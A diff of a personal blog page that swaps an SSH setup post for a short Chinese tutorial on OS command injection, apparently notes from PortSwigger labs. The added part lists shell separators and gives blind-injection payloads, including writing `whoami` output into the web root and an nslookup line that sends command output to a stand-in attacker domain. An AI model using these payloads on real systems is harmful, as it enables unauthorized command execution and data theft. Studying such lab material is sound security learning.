@@ -33,30 +33,30 @@
     <!-- meta -->
 
 
-<title>SSH | 早点睡zZZ</title>
+<title>命令注入 | 早点睡zZZ</title>
 
 
-    <meta name="keywords" content="Practice">
+    <meta name="keywords" content="Point">
 
 
 
 
     <!-- OpenGraph -->
  
-    <meta name="description" content="此次实践是利用 kali 自带的 ssh 服务器来对 ssh 进行一次初体验，对于 ssh 还有很多东西有待探索">
+    <meta name="description" content="简介 命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。 我的理解是：在完成 web 网页的一些功能时，需要执行系统命令。而攻击者通过控制输入，使服务器">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSH">
-<meta property="og:url" content="https://ghdemi.github.io/2022/04/16/SSH/index.html">
+<meta property="og:title" content="命令注入">
+<meta property="og:url" content="https://ghdemi.github.io/2022/04/20/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="早点睡zZZ">
-<meta property="og:description" content="此次实践是利用 kali 自带的 ssh 服务器来对 ssh 进行一次初体验，对于 ssh 还有很多东西有待探索">
+<meta property="og:description" content="简介 命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。 我的理解是：在完成 web 网页的一些功能时，需要执行系统命令。而攻击者通过控制输入，使服务器">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/微信图片_20220402173531.jpg">
-<meta property="article:published_time" content="2022-04-16T13:28:54.000Z">
-<meta property="article:modified_time" content="2022-04-17T02:53:44.518Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/wallhaven-lq1qwl.jpg">
+<meta property="article:published_time" content="2022-04-20T12:42:56.000Z">
+<meta property="article:modified_time" content="2022-04-20T12:54:09.093Z">
 <meta property="article:author" content="GhDemi">
-<meta property="article:tag" content="Practice">
+<meta property="article:tag" content="Point">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/微信图片_20220402173531.jpg">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/wallhaven-lq1qwl.jpg">
 
 
     
@@ -152,12 +152,12 @@
 
 <div class="post-title">
     <h1 class="post-title__text">
-        SSH
+        命令注入
     </h1>
     <div class="post-title__meta">
-        <a href="/archives/2022/04/" class="post-meta__date button">2022-04-16</a>
+        <a href="/archives/2022/04/" class="post-meta__date button">2022-04-20</a>
         
-    <span class="separate-dot"></span><a href="/categories/Kali/" class="button">Kali</a>
+    <span class="separate-dot"></span><a href="/categories/PortSwigger/" class="button">PortSwigger</a>
 
  
         
@@ -174,7 +174,7 @@
 
     <aside class="post-side">
         <div class="post-side__toc">
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-text">目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text">过程</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-v2"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">注入方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">有回显的命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">无回显的命令注入</span></a></li></ol></li></ol>
         </div>
     </aside>
     <a class="btn-toc button" id="btn-toc" tabindex="0">
@@ -184,54 +184,64 @@
     </a>
     <div class="toc-menus" id="toc-menus">
         <div class="toc-title">文章目录</div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-text">目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text">过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-v2"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">注入方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">有回显的命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">无回显的命令注入</span></a></li></ol></li></ol>
     </div>
 
 
 <article class="post post__with-toc content-card">
     <div class="post__header">
     
-        <div class="post-thumbnail" style="background-image: url('https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/微信图片_20220402173531.jpg');"></div>
+        <div class="post-thumbnail" style="background-image: url('https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/wallhaven-lq1qwl.jpg');"></div>
     
 </div>
     <div class="post__content">
-        <p>此次实践是利用 kali 自带的 ssh 服务器来对 ssh 进行一次初体验，对于 ssh 还有很多东西有待探索</p>
-<span id="more"></span>
-<h3 id="简介">简介</h3>
-<p>一种加密网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境，用于远程登录，但是SSH服务仅限于终端程序。</p>
-<h3 id="目标">目标</h3>
-<p>用本地主机远程登录kali机</p>
-<h3 id="过程">过程</h3>
+        <h3 id="简介-v2">简介</h3>
+<p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。</p>
+<p>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p>
+<p>我的理解是：在完成 web 网页的一些功能时，需要执行系统命令。而攻击者通过控制输入，使服务器对恶意输入的系统命令进行执行，从而达到窃取一些信息甚至更严重的行为的目的。</p>
+<h3 id="注入方式">注入方式</h3>
+<p>利用下列字符充当命令分隔符，将多个命令拼接在一起</p>
+<blockquote>
+<p>&amp;</p>
+<p>&amp;&amp;<br>
+|</p>
+<p>||</p>
+<p>; 分号</p>
+<p>` 反引号</p>
+</blockquote>
+<p>输入输出重定向符号</p>
+<blockquote>
+<p>&lt;   &lt;&lt;   :&gt;   &amp;&gt;   2&amp;&gt;   2&lt;&gt;&gt;&amp;   &gt;&amp;2</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">各符号详解以及例子</a></p>
+<h3 id="注入类型">注入类型</h3>
+<h4 id="有回显的命令注入">有回显的命令注入</h4>
+<p>那我们可以直接输入注入命令，观察注入结果即可</p>
+<h4 id="无回显的命令注入">无回显的命令注入</h4>
+<p>无回显就导致我们没有办法判断我们所注入的命令是否被完成，一下的几种方式能够帮助我们判断是否命令被执行</p>
 <ol>
-<li>kali安装ssh服务器</li>
+<li>
+<p>利用时间延迟</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入点+||+ping -c 10 127.0.0.1+|| </span><br></pre></td></tr></table></figure>
+<p>利用符号 || 来分隔命令</p>
+</li>
+<li>
+<p>利用输出重定向</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入点+||+whoami &gt; /var/www/static/whoami.txt+||</span><br><span class="line">filename=whoami.txt  //在网页请求文件内容的 URL 中修改参数</span><br></pre></td></tr></table></figure>
+<p>既然信息无法回显，那我们就将输出的信息进行重定向，将它输入到 &gt; 后的目标文件中去，然后利用浏览器去获取你所保存的文件。因此我们也可以看出来我们文件重定向的位置最好是在有为网页提供内容的文件夹下，这样我们可以直接通过修改该网页的 URL 来获取我们的文件。</p>
+<p>在获取图片的文件中请求我们所重定向的文件</p>
+<p><img src="%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20220420203811133.png" alt="image-20220420203811133"></p>
+</li>
+<li>
+<p>外带 OASI 技术(依靠 DNS 查找响应)</p>
+<p>可以仅仅只依靠是否发生了 DNS 查找，也可以是包含了命令结果的 DNS 查找。</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入点+||+nslookup+kgji2ohoyw.web-attacker.com+||  //不带信息的 DNS 触发</span><br><span class="line">注入点+||+nslookup+`whoami`.kgji2ohoyw.web-attacker.com+||  //带信息的 DNS 触发</span><br></pre></td></tr></table></figure>
+<p><img src="%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20220417144837824.png" alt="image-20220417144837824"></p>
+</li>
 </ol>
-<p>输入语句以安装ssh</p>
-<p><code>sudo apt-get install openssh-server</code></p>
-<p>查看安装是否成功</p>
-<p>ssh -v</p>
-<ol start="2">
-<li>通过 ifconfig 查看kali机IP地址</li>
-</ol>
-<p><img src="image-20220313170359162.png" alt="image-20220313170359162"></p>
-<ol start="3">
-<li>kali机开启ssh服务</li>
-</ol>
-<p><code>service ssh start</code></p>
-<p>通过下面命令查看ssh服务状态，状态应当是running</p>
-<p><code>service ssh status</code></p>
-<p><img src="image-20220314172448742.png" alt="image-20220314172448742"></p>
-<ol start="4">
-<li>本机远程登录kali机</li>
-</ol>
-<p>输入命令</p>
-<p><code>ssh user@ip/hostname</code></p>
-<p>首次进行登录时会出现如下信息</p>
-<p><img src="image-20220313171401502.png" alt="image-20220313171401502"></p>
-<p>这是因为第一次登录时，本机对于服务器来说是陌生的，因此需要进行确认。</p>
-<p>输入yes后再输入kali机密码就登录成功了</p>
-<p><img src="image-20220313171957070.png" alt="image-20220313171957070"></p>
-<p>输入exit退出ssh</p>
-<p><strong>PS:</strong> 每次重新开启kali机后，ssh服务都是默认关闭状态，必须要重新开启该服务。</p>
 
     </div>
     
@@ -243,7 +253,7 @@
             <strong>
                 本文链接：
             </strong>
-            <a href="https://ghdemi.github.io/2022/04/16/SSH/">https://ghdemi.github.io/2022/04/16/SSH/</a>
+            <a href="https://ghdemi.github.io/2022/04/20/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">https://ghdemi.github.io/2022/04/20/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</a>
         </p>
         
             <strong>
@@ -253,38 +263,24 @@
         
     </div>
  
-    <div class="post-footer__meta"><p>更新于 2022-04-17</p></div> 
-    <div class="post-entry__tags"><a href="/tags/Practice/" class="post-tags__link button"># Practice</a></div> 
+    <div class="post-footer__meta"><p>更新于 2022-04-20</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Point/" class="post-tags__link button"># Point</a></div> 
 </article>
 
 
     <div class="nav">
         <div class="nav__prev">
             
-                <a href="/2022/04/20/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="nav__link">
-                    <div>
-                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
-                    </div>
-                    <div>
-                        <div class="nav__label">
-                            Previous Post
-                        </div>
-                        <div class="nav__title">
-                            命令注入
-                        </div>
-                    </div>
-                </a>
-            
         </div>
         <div class="nav__next">
             
-                <a href="/2022/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019--HTTP/" class="nav__link">
+                <a href="/2022/04/16/SSH/" class="nav__link">
                     <div>
                         <div class="nav__label">
                             Next Post
                         </div>
                         <div class="nav__title">
-                            极客大挑战2019——HTTP
+                            SSH
                         </div>
                     </div>
                     <div>
